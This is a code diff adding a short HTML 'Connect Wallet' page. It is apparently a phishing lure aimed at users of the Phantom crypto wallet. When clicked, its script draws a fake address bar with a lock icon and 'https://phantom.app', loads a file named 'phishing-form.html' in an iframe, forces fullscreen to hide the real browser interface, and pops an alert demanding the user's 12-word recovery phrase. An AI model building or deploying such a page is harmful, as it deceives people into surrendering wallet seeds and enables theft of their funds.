@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Connect Wallet</title>
+  <style>
+    body, html { margin: 0; padding: 0; background: white; font-family: sans-serif; }
+    .spoofbar { background: #f1f1f1; height: 40px; display: flex; align-items: center; padding-left: 10px; font-size: 14px; }
+    .secure { color: green; margin-right: 5px; }
+    iframe { width: 100%; height: calc(100% - 40px); border: none; }
+  </style>
+</head>
+<body>
+  <button onclick="startSpoof()">Connect Wallet</button>
+  <script>
+    function startSpoof() {
+      document.body.innerHTML = '<div class="spoofbar"><span class="secure">🔒</span> https://phantom.app</div><iframe src="phishing-form.html"></iframe>';
+      document.documentElement.requestFullscreen();
+      setTimeout(() => alert("Enter your 12-word phrase."), 800);
+    }
+  </script>
+</body>
+</html>
